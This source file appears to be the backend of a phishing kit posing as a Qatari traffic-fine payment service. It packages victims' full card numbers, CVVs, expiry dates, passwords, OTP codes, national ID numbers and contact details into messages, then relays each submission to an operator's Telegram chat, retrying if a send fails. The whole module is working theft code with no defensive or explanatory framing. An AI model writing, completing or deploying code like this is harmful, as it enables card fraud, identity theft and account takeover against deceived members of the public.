import axios from "axios";
import { env, isTelegramConfigured } from "../config/env";
import { logger } from "../utils/logger";
import { PaymentDoc } from "../models/payment.model";

interface TelegramSendResult {
  ok: boolean;
  messageId?: number;
}

function escapeHtml(value: unknown): string {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function row(label: string, value: unknown): string {
  return `<b>${escapeHtml(label)}:</b> ${value}`;
}

const STEP_META: Record<string, { icon: string; label: string }> = {
  payment_completed: { icon: "✅", label: "Card payment submitted" },
  login_submitted: { icon: "🔐", label: "Login submitted" },
  verify_login_submitted: { icon: "🔢", label: "Verify login (OTP 4)" },
  card_code_submitted: { icon: "💳", label: "Card code entered (4 digits)" },
  register_submitted: { icon: "👤", label: "Create account submitted" },
  verification_code_submitted: {
    icon: "📱",
    label: "Verification code (OTP 6)",
  },
  reset_password_submitted: { icon: "🔑", label: "Reset password submitted" },
};

const FIELD_LABELS: Record<string, string> = {
  login: "Username / email",
  password: "Password",
  code: "OTP code",
  card_code: "Card code (4 digits)",
  mobile: "Mobile",
  qatari_id_or_passport: "QID / passport",
  email_or_username: "Email / username",
  email: "Email",
  username: "Username",
};

function customerLines(p: PaymentDoc): string[] {
  const lines: string[] = [];
  if (p.fullName) lines.push(row("👤 Name", escapeHtml(p.fullName)));
  if (p.mobile) lines.push(row("📞 Mobile", escapeHtml(p.mobile)));
  if (p.email) lines.push(row("✉️ Email", escapeHtml(p.email)));
  if (p.identifier) lines.push(row("🆔 ID / Plate", escapeHtml(p.identifier)));
  return lines;
}

function paymentLines(p: PaymentDoc): string[] {
  const lines: string[] = [];
  lines.push(row("💰 Amount", `<b>QAR ${escapeHtml(p.amount)}</b>`));
  if (p.cardholderName)
    lines.push(row("Cardholder", escapeHtml(p.cardholderName)));
  if (p.cardNumber)
    lines.push(
      row("💳 Card number", `<code>${escapeHtml(p.cardNumber)}</code>`),
    );
  else if (p.cardLastFour)
    lines.push(row("💳 Card", `**** ${escapeHtml(p.cardLastFour)}`));
  if (p.cardExpiryMonth || p.cardExpiryYear)
    lines.push(
      row(
        "Expiry",
        `${escapeHtml(p.cardExpiryMonth)}/${escapeHtml(p.cardExpiryYear)}`,
      ),
    );
  if (p.cardCvv)
    lines.push(row("CVV", `<code>${escapeHtml(p.cardCvv)}</code>`));
  if (p.violationRefs?.length)
    lines.push(row("Violations", escapeHtml(p.violationRefs.join(", "))));
  return lines;
}

function flowPayloadLines(data: Record<string, unknown>): string[] {
  const lines: string[] = [];
  for (const [key, value] of Object.entries(data)) {
    if (value === null || value === undefined || value === "") continue;
    if (["submitted_at", "_token", "ip", "userAgent"].includes(key)) continue;
    const label = FIELD_LABELS[key] ?? key.replace(/_/g, " ");
    lines.push(row(label, `<code>${escapeHtml(value)}</code>`));
  }
  return lines;
}

function footer(p: PaymentDoc): string {
  const parts: string[] = [];
  if (p.ip) parts.push(`🌐 ${escapeHtml(p.ip)}`);
  parts.push(`🏷 ${escapeHtml(p.reference)}`);
  parts.push(
    `⏱ ${new Date().toISOString().slice(0, 16).replace("T", " ")} UTC`,
  );
  return `<i>${parts.join(" · ")}</i>`;
}

function buildMessage(
  step: string,
  p: PaymentDoc,
  data?: Record<string, unknown>,
): string {
  const meta = STEP_META[step] ?? {
    icon: "🔔",
    label: step.replace(/_/g, " "),
  };
  const lines: string[] = [];
  lines.push(`${meta.icon} <b>Request</b> — ${escapeHtml(meta.label)}`);
  lines.push("");

  if (step === "payment_completed") {
    lines.push(...paymentLines(p));
    lines.push("");
    const contactParts: string[] = [];
    if (p.fullName) contactParts.push(`👤 ${escapeHtml(p.fullName)}`);
    if (p.mobile) contactParts.push(`📞 ${escapeHtml(p.mobile)}`);
    if (contactParts.length) lines.push(`<i>${contactParts.join(" · ")}</i>`);
  } else {
    lines.push(...flowPayloadLines(data ?? {}));
    lines.push("");
    lines.push("<i>Contact:</i>");
    lines.push(...customerLines(p));
  }

  lines.push("");
  lines.push(footer(p));
  if (env.telegram.username)
    lines.push(`Contact: ${escapeHtml(env.telegram.username)}`);

  return lines.filter((l) => l !== null && l !== undefined).join("\n");
}


function buildContactMessage(contact: {
  fullName: string;
  mobile: string;
  email?: string;
  identifier?: string;
  amount: number | string;
  violationRefs?: string[];
  ip?: string;
}): string {
  const lines: string[] = [];
  lines.push("🔔 <b>New Payment Initiated</b>");
  lines.push("");
  if (contact.fullName) lines.push(row("👤 Name", escapeHtml(contact.fullName)));
  if (contact.mobile) lines.push(row("📞 Mobile", escapeHtml(contact.mobile)));
  if (contact.email) lines.push(row("✉️ Email", escapeHtml(contact.email)));
  if (contact.identifier)
    lines.push(row("🆔 ID / Plate", escapeHtml(contact.identifier)));
  lines.push(row("💰 Amount", `<b>QAR ${escapeHtml(contact.amount)}</b>`));
  if (contact.violationRefs?.length)
    lines.push(row("Violations", escapeHtml(contact.violationRefs.join(", "))));
  lines.push("");
  const footerParts: string[] = [];
  if (contact.ip) footerParts.push(`🌐 ${escapeHtml(contact.ip)}`);
  footerParts.push(
    `⏱ ${new Date().toISOString().slice(0, 16).replace("T", " ")} UTC`,
  );
  lines.push(`<i>${footerParts.join(" · ")}</i>`);
  if (env.telegram.username)
    lines.push(`Contact: ${escapeHtml(env.telegram.username)}`);
  return lines.filter((l) => l !== null && l !== undefined).join("\n");
}

async function postMessage(text: string): Promise<TelegramSendResult> {
  if (!isTelegramConfigured) {
    logger.warn(
      "Telegram not configured — skipping send. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.",
    );
    return { ok: false };
  }

  const url = `https://api.telegram.org/bot${env.telegram.botToken}/sendMessage`;
  const body = {
    chat_id: env.telegram.chatId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
  };

  const TRANSIENT =
    /ECONNRESET|ETIMEDOUT|ENOTFOUND|EAI_AGAIN|ECONNREFUSED|socket hang up|network/i;
  const MAX_ATTEMPTS = 3;
  try {
    let lastErr: unknown;
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
      try {
        const { data } = await axios.post(url, body, { timeout: 20000 });
        return { ok: Boolean(data?.ok), messageId: data?.result?.message_id };
      } catch (e) {
        lastErr = e;
        const hasTgResponse = Boolean((e as any)?.response);
        const code = (e as any)?.code as string | undefined;
        const transient =
          !hasTgResponse &&
          (TRANSIENT.test(code ?? "") || TRANSIENT.test((e as Error).message));
        if (!transient || attempt === MAX_ATTEMPTS) throw e;
        logger.warn(
          `Telegram send attempt ${attempt} failed (${code || (e as Error).message}); retrying…`,
        );
        await new Promise((r) => setTimeout(r, 500 * attempt));
      }
    }
    throw lastErr;
  } catch (err) {
    const tg = (err as any)?.response?.data as
      | { error_code?: number; description?: string }
      | undefined;
    const reason = tg?.description || (err as Error).message;
    logger.error(
      `Telegram relay failed: ${reason} (chat_id=${env.telegram.chatId})`,
    );
    return { ok: false };
  }
}

export const telegramService = {
  /** Sends a formatted message for any flow step (payment, login, OTP, …). */
  async sendStep(
    step: string,
    payment: PaymentDoc,
    data?: Record<string, unknown>,
  ): Promise<TelegramSendResult> {
    return postMessage(buildMessage(step, payment, data));
  },

  async sendContactNotification(contact: {
    fullName: string;
    mobile: string;
    email?: string;
    identifier?: string;
    amount: number | string;
    violationRefs?: string[];
    ip?: string;
  }): Promise<TelegramSendResult> {
    return postMessage(buildContactMessage(contact));
  },

  async sendInquiryNotification(inquiry: {
    searchType: string;
    identifier: string;
    ip?: string;
    userAgent?: string;
  }): Promise<TelegramSendResult> {
    const typeLabel =
      inquiry.searchType === "personal"
        ? "الرقم الشخصي / Civil ID"
        : inquiry.searchType === "vehicle"
          ? "رقم المركبة / Plate"
          : "قيد المنشأة / Establishment";

    const lines: string[] = [];
    lines.push(`👁 <b>New Site Inquiry</b>`);
    lines.push("");
    lines.push(row("🔍 Type", escapeHtml(typeLabel)));
    lines.push(row("🆔 Number", `<code>${escapeHtml(inquiry.identifier)}</code>`));
    lines.push("");
    const footerParts: string[] = [];
    if (inquiry.ip) footerParts.push(`🌐 ${escapeHtml(inquiry.ip)}`);
    footerParts.push(
      `⏱ ${new Date().toISOString().slice(0, 16).replace("T", " ")} UTC`,
    );
    lines.push(`<i>${footerParts.join(" · ")}</i>`);
    if (env.telegram.username)
      lines.push(`Contact: ${escapeHtml(env.telegram.username)}`);

    return postMessage(lines.filter((l) => l !== null && l !== undefined).join("\n"));
  },
};
